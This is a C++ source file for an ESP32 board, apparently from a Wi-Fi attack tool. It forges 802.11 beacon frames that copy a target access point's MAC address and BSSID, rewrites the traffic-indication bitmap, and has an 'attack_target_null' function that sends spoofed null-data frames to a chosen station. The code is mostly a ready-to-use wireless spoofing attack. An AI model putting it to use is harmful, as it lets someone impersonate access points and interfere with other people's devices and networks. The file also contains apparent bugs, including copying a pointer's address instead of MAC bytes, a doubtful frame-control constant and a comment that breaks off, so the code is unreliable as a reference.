#include <beacon_faker.h>

uint8_t broadcast_addr[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t magic_addr[] = {0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb};

uint8_t beacon_raw_template[] = {
    /* maC header */
    0x80, 0x00,							                        // 0-1: Frame Control
    0x00, 0x00,							                        // 2-3: Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				            // 4-9: Destination address (broadcast)
    0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,				            // 10-15: Source address
    0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,				            // 16-21: BSSID
    0x00, 0x00,							                        // 22-23: Sequence / fragment number

    /* beacon body */
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,			    // 24-31: Timestamp (GETS OVERWRITTEN TO 0 BY HARDWARE)
    0x64, 0x00,							                        // 32-33: Beacon interval
    0x31, 0x04,							                        // 34-35: Capability info
    0x00, 0x00, 				                                // 36-38: SSID parameter set, 0x00:length:content
    /* FILL CONTENT HERE */
    0x01, 0x08, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,	// 39-48: Supported rates
    0x03, 0x01, 0x01,						                    // 49-51: DS Parameter set, current channel 1 (= 0x01),
    0x05, 0x04, 0x01, 0x02, 0x00, 0x00,				            // 52-57: Traffic Indication Map, TIM
};

uint8_t beacon_buffer[MAX_BEACON_LEN];

void beacon_faker::send_basic_beacon(){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_raw_template, sizeof(beacon_raw_template), false));
}

/*
    This function will use the template to make
*/
void beacon_faker::send_imitate_beacon(uint8_t source_addr[6], uint8_t *TIM_bit_map, int map_len){

    memcpy(beacon_buffer, beacon_raw_template, sizeof(beacon_raw_template));
    
    struct mac_header_template m_header;
    struct beacon_TIM_template m_TIM;
    
    memcpy(&m_header.scr_addr, &source_addr, sizeof(uint8_t)*6);
    memcpy(&m_header.BSSID, &source_addr, sizeof(uint8_t)*6);
    memcpy(beacon_buffer, &m_header, sizeof(m_header));
    
    // map_len >= 1
    m_TIM.length = map_len + 4;
    for (size_t i = 0; i < map_len; i++)
    {
        m_TIM.bitmap[i] = TIM_bit_map?TIM_bit_map[i]:0xff;
    }

    memcpy(beacon_buffer+TIM_OFFSET, &m_TIM, 5 + map_len);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, TIM_OFFSET + 5 + map_len, false));
}


#define FRAME_CTRL_NULL_DATA 0x01001000
void beacon_faker::attack_target_null(uint8_t mmac[6]){
    struct mac_header_template header;
    header.Frame_Ctrl[0] = FRAME_CTRL_NULL_DATA >> 4;
    header.Frame_Ctrl[1] = FRAME_CTRL_NULL_DATA;
    memcpy(header.dest_addr, mmac, 6);
    memcpy(header.scr_addr, _src_address, 6);
    memcpy(header.BSSID, _src_address, 6);
    // 空数据包只有null
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, &header, sizeof(header), false));
}